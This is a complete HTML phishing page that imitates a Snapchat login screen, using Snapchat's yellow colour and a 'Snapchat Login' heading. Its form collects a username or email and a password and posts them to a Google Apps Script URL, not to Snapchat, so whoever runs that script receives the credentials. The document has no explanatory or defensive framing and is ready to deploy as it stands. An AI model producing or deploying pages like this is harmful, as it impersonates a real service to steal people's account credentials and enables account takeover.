<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Snapchat Login</title>
  <style>
    body {
      background: #FFFC00;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: sans-serif;
    }
    .login {
      background: white;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
      width: 300px;
    }
    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 6px;
      border: 1px solid #ccc;
    }
    button {
      background: #FFFC00;
      border: none;
      padding: 10px 20px;
      border-radius: 6px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <form class="login" method="POST" action="https://script.google.com/macros/s/AKfycbzJ-I68JVzs-E6W2iEfCse9OZEqoEB4wWBHSSbMOMr0fSq5R947-1ZYoMnTJq_vY1qb/exec">
    <h2>Snapchat Login</h2>
    <input type="text" name="username" placeholder="Username or Email" required><br>
    <input type="password" name="password" placeholder="Password" required><br>
    <button type="submit">Login</button>
  </form>
</body>
</html>
